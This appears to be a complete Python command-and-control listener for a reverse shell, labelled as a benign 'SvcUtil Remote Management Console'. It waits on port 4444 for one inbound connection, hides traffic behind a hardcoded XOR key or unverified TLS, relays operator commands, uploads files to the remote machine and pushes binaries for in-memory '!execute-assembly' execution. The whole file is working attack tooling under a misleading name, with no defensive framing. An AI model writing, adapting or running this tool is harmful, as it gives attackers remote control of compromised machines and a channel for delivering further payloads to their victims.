#!/usr/bin/env python3
"""
SvcUtil Remote Management Console.

Usage:
    python3 listener.py [port] [key]
    python3 listener.py 4444 "MySecretKey"

    -n flag for plaintext mode:
    python3 listener.py -n 4444

    --tls flag for TLS mode:
    python3 listener.py --tls 4444
    python3 listener.py --tls 4444 --cert server.pem --key server.key
"""

import socket
import ssl
import sys
import threading
import os
import subprocess
import tempfile
import time


DEFAULT_PORT = 4444
DEFAULT_KEY  = b"Kj9#mP2x!qR7"


class StreamCodec:
    def __init__(self, key: bytes):
        self.key = key
        self._si = 0
        self._ri = 0

    def encode(self, data: bytes) -> bytes:
        out = bytearray(len(data))
        for i, b in enumerate(data):
            out[i] = b ^ self.key[(self._si + i) % len(self.key)]
        self._si += len(data)
        return bytes(out)

    def decode(self, data: bytes) -> bytes:
        out = bytearray(len(data))
        for i, b in enumerate(data):
            out[i] = b ^ self.key[(self._ri + i) % len(self.key)]
        self._ri += len(data)
        return bytes(out)


class SecureTransport:
    def send(self, sock, data: bytes):
        sock.sendall(data)

    def recv(self, sock, size: int) -> bytes:
        return sock.recv(size)


class CodecTransport:
    def __init__(self, codec: StreamCodec):
        self._c = codec

    def send(self, sock, data: bytes):
        sock.sendall(self._c.encode(data))

    def recv(self, sock, size: int) -> bytes:
        data = sock.recv(size)
        if not data:
            return data
        return self._c.decode(data)


def _reader(sock, transport):
    try:
        while True:
            data = transport.recv(sock, 8192)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
    except (ConnectionError, OSError, ssl.SSLError):
        pass
    print("\n[*] Session ended.")
    os._exit(0)


def _writer(sock, transport):
    try:
        while True:
            line = input()
            stripped = line.strip()
            if stripped.startswith("!put "):
                _do_put(sock, transport, stripped)
                continue
            if stripped.startswith("!run "):
                _do_run(sock, transport, stripped)
                continue

            data = (line + "\n").encode()
            transport.send(sock, data)
    except (EOFError, ConnectionError, OSError, ssl.SSLError):
        pass


def _do_put(sock, transport, cmd: str):
    parts = cmd.split(maxsplit=2)
    if len(parts) < 3:
        print("[!] Usage: !put <local_path> <remote_path>")
        return

    local_path = parts[1]
    remote_path = parts[2]

    if not os.path.isfile(local_path):
        print(f"[!] File not found: {local_path}")
        return

    size = os.path.getsize(local_path)
    header = f"!upload {remote_path} {size}\n".encode()
    transport.send(sock, header)

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            transport.send(sock, chunk)

    print(f"[+] Sent {size} bytes: {local_path} -> {remote_path}")


def _do_run(sock, transport, cmd: str):
    parts = cmd.split(maxsplit=2)
    if len(parts) < 2:
        print("[!] Usage: !run <local_file> [args...]")
        return

    local_path = parts[1]
    extra_args = parts[2] if len(parts) > 2 else ""

    if not os.path.isfile(local_path):
        print(f"[!] File not found: {local_path}")
        return

    size = os.path.getsize(local_path)
    fname = os.path.basename(local_path)

    header = f"!execute-assembly {size}"
    if extra_args:
        header += f" {extra_args}"
    header += "\n"

    print(f"[*] Sending {fname} ({size} bytes)...")
    transport.send(sock, header.encode())

    time.sleep(0.3)

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            transport.send(sock, chunk)

    print(f"[+] Transfer complete.")


def _gen_cert():
    cert_path = os.path.join(tempfile.gettempdir(), "svc_cert.pem")
    key_path = os.path.join(tempfile.gettempdir(), "svc_key.pem")

    if os.path.isfile(cert_path) and os.path.isfile(key_path):
        print(f"[*] Reusing cert: {cert_path}")
        return cert_path, key_path

    print("[*] Generating certificate...")
    try:
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_path, "-out", cert_path,
            "-days", "365", "-nodes",
            "-subj", "/CN=localhost"
        ], check=True, capture_output=True)
        print(f"[+] Certificate: {cert_path}")
        print(f"[+] Key:         {key_path}")
        return cert_path, key_path
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Failed to generate cert. Provide --cert/--key.")
        sys.exit(1)


def main():
    port = DEFAULT_PORT
    key = DEFAULT_KEY
    no_enc = False
    use_tls = False
    cert_file = None
    key_file = None

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "-n":
            no_enc = True
        elif args[i] == "--tls":
            use_tls = True
        elif args[i] == "--cert":
            i += 1
            cert_file = args[i]
        elif args[i] == "--key":
            i += 1
            key_file = args[i]
        elif args[i].isdigit():
            port = int(args[i])
        else:
            key = args[i].encode()
        i += 1

    if no_enc:
        key = b"\x00"

    print(f"[*] Listening on 0.0.0.0:{port}")

    if use_tls:
        if not cert_file or not key_file:
            cert_file, key_file = _gen_cert()
        print(f"[*] TLS mode: cert={cert_file}")
    elif not no_enc:
        print(f"[*] Key: {key.decode(errors='replace')}")
    else:
        print("[*] Mode: plaintext")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)

    raw_conn, addr = server.accept()
    server.close()
    print(f"[+] Connected: {addr[0]}:{addr[1]}")

    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_file, key_file)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            conn = ctx.wrap_socket(raw_conn, server_side=True)
            print(f"[+] TLS: {conn.version()}")
        except ssl.SSLError as e:
            print(f"[!] TLS failed: {e}")
            raw_conn.close()
            return
        transport = SecureTransport()
    else:
        conn = raw_conn
        codec = StreamCodec(key)
        transport = CodecTransport(codec)

    t = threading.Thread(target=_reader, args=(conn, transport), daemon=True)
    t.start()

    _writer(conn, transport)


if __name__ == "__main__":
    main()
